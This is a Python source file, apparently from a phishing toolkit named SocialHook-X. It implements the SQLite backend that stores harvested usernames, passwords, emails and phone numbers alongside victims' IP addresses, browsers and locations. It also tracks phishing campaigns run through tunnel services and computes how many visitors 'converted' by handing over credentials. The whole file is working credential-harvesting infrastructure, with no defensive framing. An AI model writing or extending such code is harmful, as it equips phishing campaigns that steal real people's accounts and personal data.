"""
SocialHook-X Database Module
Handles credential storage and analytics
"""

import json
import logging
import sqlite3
import tempfile
from contextlib import contextmanager
from pathlib import Path
from typing import Dict, Iterator, List, Optional

logger = logging.getLogger(__name__)


class CredentialDB:
    """Database manager for credentials and analytics"""

    def __init__(self, db_path: str = "captured_data/credentials.db"):
        self.db_path = db_path
        self._memory_conn: Optional[sqlite3.Connection] = None

        if self.db_path == ":memory:":
            # Keep a single in-memory connection alive so schema/data persists.
            self._memory_conn = sqlite3.connect(self.db_path, check_same_thread=False)

        try:
            self.init_database()
        except sqlite3.Error as e:
            # In-memory databases have no filesystem fallback.
            if self._memory_conn is not None:
                raise

            fallback = self._get_fallback_db_path(db_path)
            logger.warning(
                f"Primary database path unavailable ({db_path}): {e}. "
                f"Falling back to {fallback}"
            )
            self.db_path = fallback
            self.init_database()

    def __del__(self):
        if self._memory_conn is not None:
            try:
                self._memory_conn.close()
            except sqlite3.Error:
                pass

    def _get_fallback_db_path(self, original_path: str) -> str:
        """Build a writable fallback database path in system temp."""
        temp_dir = Path(tempfile.gettempdir()) / "socialhook-x"
        temp_dir.mkdir(parents=True, exist_ok=True)
        return str(temp_dir / Path(original_path).name)

    @contextmanager
    def _connection(self) -> Iterator[sqlite3.Connection]:
        """Yield a DB connection and close non-shared connections automatically."""
        if self._memory_conn is not None:
            yield self._memory_conn
            return

        conn = sqlite3.connect(self.db_path)
        try:
            yield conn
        finally:
            conn.close()

    def init_database(self):
        """Initialize database with required tables."""
        if self.db_path != ":memory:":
            Path(self.db_path).parent.mkdir(parents=True, exist_ok=True)

        db_exists = self.db_path != ":memory:" and Path(self.db_path).exists()

        with self._connection() as conn:
            cursor = conn.cursor()

            if not db_exists or self.db_path == ":memory:":
                cursor.execute(
                    """
                    CREATE TABLE IF NOT EXISTS credentials (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        template TEXT NOT NULL,
                        username TEXT,
                        password TEXT,
                        email TEXT,
                        phone TEXT,
                        extra_data TEXT,
                        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                        ip_address TEXT,
                        user_agent TEXT,
                        browser TEXT,
                        os TEXT
                    )
                    """
                )

                cursor.execute(
                    "CREATE INDEX IF NOT EXISTS idx_template ON credentials(template)"
                )
                cursor.execute(
                    "CREATE INDEX IF NOT EXISTS idx_timestamp ON credentials(timestamp)"
                )

                cursor.execute(
                    """
                    CREATE TABLE IF NOT EXISTS visitors (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        template TEXT NOT NULL,
                        ip_address TEXT,
                        user_agent TEXT,
                        referrer TEXT,
                        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                        geo_data TEXT,
                        converted BOOLEAN DEFAULT 0
                    )
                    """
                )

                cursor.execute(
                    """
                    CREATE TABLE IF NOT EXISTS campaigns (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        template TEXT NOT NULL,
                        url TEXT,
                        tunnel_service TEXT,
                        port INTEGER,
                        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                        stopped_at DATETIME,
                        status TEXT DEFAULT 'active'
                    )
                    """
                )

                cursor.execute(
                    """
                    CREATE TABLE IF NOT EXISTS geo_cache (
                        ip_address TEXT PRIMARY KEY,
                        country TEXT,
                        city TEXT,
                        latitude REAL,
                        longitude REAL,
                        isp TEXT,
                        cached_at DATETIME DEFAULT CURRENT_TIMESTAMP
                    )
                    """
                )

                conn.commit()
                logger.info(f"Database initialized at {self.db_path}")
            else:
                logger.info(f"Database already exists at {self.db_path}")

    @staticmethod
    def _sanitize_value(value, sanitize) -> str:
        if value is None:
            return ""
        return sanitize(str(value))

    def add_credential(self, cred_dict: Dict) -> int:
        """Store captured credential."""
        try:
            if not cred_dict.get("template"):
                logger.error("Template required for credential storage")
                return -1

            from core.utils.validators import Validators

            sanitize = Validators.sanitize_string

            with self._connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    """
                    INSERT INTO credentials
                    (template, username, password, email, phone, extra_data,
                     ip_address, user_agent, browser, os)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                    (
                        self._sanitize_value(cred_dict.get("template", ""), sanitize),
                        self._sanitize_value(cred_dict.get("username", ""), sanitize),
                        self._sanitize_value(cred_dict.get("password", ""), sanitize),
                        self._sanitize_value(cred_dict.get("email", ""), sanitize),
                        self._sanitize_value(cred_dict.get("phone", ""), sanitize),
                        json.dumps(cred_dict.get("extra_data", {}), default=str),
                        self._sanitize_value(cred_dict.get("ip_address", ""), sanitize),
                        self._sanitize_value(cred_dict.get("user_agent", ""), sanitize),
                        self._sanitize_value(cred_dict.get("browser", ""), sanitize),
                        self._sanitize_value(cred_dict.get("os", ""), sanitize),
                    ),
                )

                conn.commit()
                cred_id = cursor.lastrowid

            logger.info(
                f"Credential stored (ID: {cred_id}, Template: {cred_dict.get('template')})"
            )
            return cred_id

        except Exception as e:
            logger.error(f"Database error adding credential: {e}")
            return -1

    def add_visitor(self, visitor_dict: Dict) -> int:
        """Track visitor visit."""
        try:
            with self._connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    """
                    INSERT INTO visitors
                    (template, ip_address, user_agent, referrer, geo_data)
                    VALUES (?, ?, ?, ?, ?)
                    """,
                    (
                        visitor_dict.get("template"),
                        visitor_dict.get("ip_address"),
                        visitor_dict.get("user_agent"),
                        visitor_dict.get("referrer"),
                        json.dumps(visitor_dict.get("geo_data", {}), default=str),
                    ),
                )

                conn.commit()
                visitor_id = cursor.lastrowid

            return visitor_id

        except Exception as e:
            logger.error(f"Database error adding visitor: {e}")
            return -1

    def mark_converted(self, visitor_id: int) -> bool:
        """Mark visitor as converted (provided credentials)."""
        try:
            with self._connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    "UPDATE visitors SET converted = 1 WHERE id = ?",
                    (visitor_id,),
                )
                conn.commit()
            return True

        except Exception as e:
            logger.error(f"Database error marking converted: {e}")
            return False

    def get_credentials(self, template: Optional[str] = None) -> List[Dict]:
        """Get all or filtered credentials."""
        try:
            with self._connection() as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()

                if template:
                    cursor.execute(
                        "SELECT * FROM credentials WHERE template = ? ORDER BY timestamp DESC",
                        (template,),
                    )
                else:
                    cursor.execute("SELECT * FROM credentials ORDER BY timestamp DESC")

                rows = cursor.fetchall()

            return [dict(row) for row in rows]

        except Exception as e:
            logger.error(f"Database error getting credentials: {e}")
            return []

    def get_statistics(self) -> Dict:
        """Get campaign statistics."""
        try:
            with self._connection() as conn:
                cursor = conn.cursor()

                cursor.execute("SELECT COUNT(*) FROM credentials")
                total_creds = cursor.fetchone()[0]

                cursor.execute("SELECT COUNT(*) FROM visitors")
                total_visitors = cursor.fetchone()[0]

                cursor.execute("SELECT COUNT(*) FROM visitors WHERE converted = 1")
                converted = cursor.fetchone()[0]

                cursor.execute(
                    """
                    SELECT template, COUNT(*) as count
                    FROM credentials
                    GROUP BY template
                    ORDER BY count DESC
                    """
                )
                template_stats = {row[0]: row[1] for row in cursor.fetchall()}

                cursor.execute(
                    """
                    SELECT country, COUNT(*) as count
                    FROM geo_cache
                    GROUP BY country
                    ORDER BY count DESC
                    LIMIT 10
                    """
                )
                top_countries = {row[0]: row[1] for row in cursor.fetchall()}

            return {
                "total_credentials": total_creds,
                "total_visitors": total_visitors,
                "conversion_rate": (converted / total_visitors * 100)
                if total_visitors > 0
                else 0,
                "template_stats": template_stats,
                "top_countries": top_countries,
            }

        except Exception as e:
            logger.error(f"Database error getting statistics: {e}")
            return {}

    def cache_geo_data(self, ip: str, geo_data: Dict) -> bool:
        """Cache geolocation data."""
        try:
            with self._connection() as conn:
                cursor = conn.cursor()
                cursor.execute(
                    """
                    INSERT OR REPLACE INTO geo_cache
                    (ip_address, country, city, latitude, longitude, isp)
                    VALUES (?, ?, ?, ?, ?, ?)
                    """,
                    (
                        ip,
                        geo_data.get("country"),
                        geo_data.get("city"),
                        geo_data.get("latitude"),
                        geo_data.get("longitude"),
                        geo_data.get("isp"),
                    ),
                )

                conn.commit()
            return True

        except Exception as e:
            logger.error(f"Database error caching geo data: {e}")
            return False

    def get_cached_geo(self, ip: str) -> Optional[Dict]:
        """Get cached geolocation data."""
        try:
            with self._connection() as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute("SELECT * FROM geo_cache WHERE ip_address = ?", (ip,))
                row = cursor.fetchone()
            return dict(row) if row else None

        except Exception as e:
            logger.error(f"Database error getting cached geo: {e}")
            return None
